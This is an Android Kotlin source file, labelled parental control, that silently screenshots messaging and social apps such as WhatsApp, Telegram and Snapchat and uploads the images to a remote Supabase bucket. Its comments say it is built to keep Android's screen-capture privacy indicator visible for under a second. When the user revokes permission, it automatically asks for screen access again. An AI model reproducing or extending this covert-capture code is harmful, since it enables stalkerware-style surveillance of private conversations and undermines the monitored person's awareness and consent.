package com.example.parentalcontrol

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.util.DisplayMetrics
import android.view.WindowManager
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import android.app.usage.UsageStatsManager

/**
 * ScreenCaptureEngine v16 — Pulse Mode
 *
 * "Pulse" logic: create VirtualDisplay → grab exactly one frame → release VD immediately
 * → upload async. This minimizes the Android 14 "Green Dot" duration to < 1 second.
 *
 * On SecurityException (revoked projection) → automatically triggers re-acquisition
 * via MonitoringForegroundService.requestProjectionReacquisition().
 */
class ScreenCaptureEngine(private val context: Context) {

    private val supabase = SupabaseManager.getInstance()

    companion object {
        private const val TAG = "ScreenCaptureEngine"
        private const val BUCKET = "monitoring_data"

        private val TARGET_APPS = setOf(
            "com.whatsapp",
            "com.facebook.orca",
            "com.instagram.android",
            "com.snapchat.android",
            "com.twitter.android",
            "com.google.android.youtube",
            "com.zhiliaoapp.musically",
            "org.telegram.messenger",
            "com.android.chrome",
            "com.facebook.katana",
            "com.tiktok.android",
            "com.discord"
        )
    }

    /**
     * Main entry point. Runs in a background coroutine.
     * @param forceCapture bypasses the target-app filter (used by CAPTURE command)
     */
    suspend fun captureAndUpload(
        projection: MediaProjection,
        forceCapture: Boolean = false
    ) = withContext(Dispatchers.IO) {

        // ── Guard: screen must be on ──────────────────────────────────────────
        val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        if (!pm.isInteractive) {
            Log.d(TAG, "Screen OFF — skipped")
            return@withContext
        }

        // ── Guard: target app filter ──────────────────────────────────────────
        if (!forceCapture) {
            val fg = getForegroundApp()
            if (fg == null || fg !in TARGET_APPS) {
                Log.d(TAG, "Skip: foreground=$fg")
                return@withContext
            }
        }

        // ── Pulse: grab frame then release VD immediately ─────────────────────
        val rawBytes = pulseCapture(projection) ?: return@withContext

        // ── Upload async so we don't block the capture loop ───────────────────
        CoroutineScope(Dispatchers.IO).launch {
            uploadBytes(rawBytes)
        }
    }

    /**
     * PULSE: create VirtualDisplay → acquire one frame → release VD → return raw bytes.
     * Green dot is visible only during this window (~300–800 ms).
     */
    @SuppressLint("WrongConstant")
    private suspend fun pulseCapture(projection: MediaProjection): ByteArray? =
        withContext(Dispatchers.IO) {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics().also {
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealMetrics(it)
            }
            val w = metrics.widthPixels
            val h = metrics.heightPixels
            val dpi = metrics.densityDpi

            val imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)

            try {
                val vd = try {
                    projection.createVirtualDisplay(
                        "Pulse",
                        w, h, dpi,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                        imageReader.surface, null, null
                    )
                } catch (se: SecurityException) {
                    Log.e(TAG, "Projection revoked: ${se.message}")
                    supabase.logRemote(context, TAG, "WARN", "Projection revoked — requesting re-acquisition")
                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                        MonitoringForegroundService.getInstance()?.requestProjectionReacquisition()
                    }
                    return@withContext null
                } catch (ise: IllegalStateException) {
                    Log.e(TAG, "Projection invalid: ${ise.message}")
                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                        MonitoringForegroundService.getInstance()?.requestProjectionReacquisition()
                    }
                    return@withContext null
                }

                // Retry up to 10 × 200 ms = 2 s max
                var image: android.media.Image? = null
                repeat(10) {
                    if (image == null) {
                        image = imageReader.acquireLatestImage()
                        if (image == null) kotlinx.coroutines.delay(200)
                    }
                }

                // ── Release VD immediately → Green Dot disappears ─────────────
                vd.release()
                
                // Wait 1 second after VD release to ensure async upload initiates
                // before any downstream projection.stop() is called
                kotlinx.coroutines.delay(1_000)

                if (image == null) {
                    Log.e(TAG, "No frame acquired")
                    supabase.logRemote(context, TAG, "ERROR", "Pulse: no frame after 2s")
                    return@withContext null
                }

                return@withContext try {
                    val plane      = image!!.planes[0]
                    val buffer     = plane.buffer
                    val pixelStride = plane.pixelStride
                    val rowStride  = plane.rowStride
                    val rowPadding = rowStride - pixelStride * w

                    val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buffer)
                    val clean = Bitmap.createBitmap(bmp, 0, 0, w, h)
                    bmp.recycle()

                    val out = java.io.ByteArrayOutputStream()
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                        clean.compress(Bitmap.CompressFormat.WEBP_LOSSY, 72, out)
                    } else {
                        @Suppress("DEPRECATION")
                        clean.compress(Bitmap.CompressFormat.WEBP, 72, out)
                    }
                    clean.recycle()
                    out.toByteArray()
                } finally {
                    image!!.close()
                }

            } finally {
                imageReader.close()
            }
        }

    /** Upload pre-encoded bytes to Supabase Storage. */
    private suspend fun uploadBytes(bytes: ByteArray) = withContext(Dispatchers.IO) {
        try {
            val ts       = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val fileName = "screen_$ts.webp"
            val tmpFile  = File(context.cacheDir, fileName)
            tmpFile.writeBytes(bytes)

            val result = supabase.uploadFile(
                file = tmpFile,
                bucket = BUCKET,
                folder = "screenshots/${getDeviceId()}",
                customFileName = fileName
            )

            if (result is UploadResult.Success) {
                Log.i(TAG, "Screenshot uploaded: ${result.fileName} (${bytes.size / 1024} KB)")
                supabase.logRemote(context, TAG, "INFO", "Screenshot OK: ${result.fileName}")
            } else {
                val err = (result as? UploadResult.Error)?.message ?: "unknown"
                Log.e(TAG, "Upload failed: $err")
                supabase.logRemote(context, TAG, "ERROR", "Screenshot upload failed: $err")
            }
            tmpFile.delete()
        } catch (e: Exception) {
            Log.e(TAG, "uploadBytes error: ${e.message}")
        }
    }

    private fun getDeviceId(): String = android.provider.Settings.Secure.getString(
        context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
    ) ?: "unknown"

    private fun getForegroundApp(): String? = try {
        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 60_000, now)
            ?.maxByOrNull { it.lastTimeUsed }?.packageName
    } catch (e: Exception) { null }
}
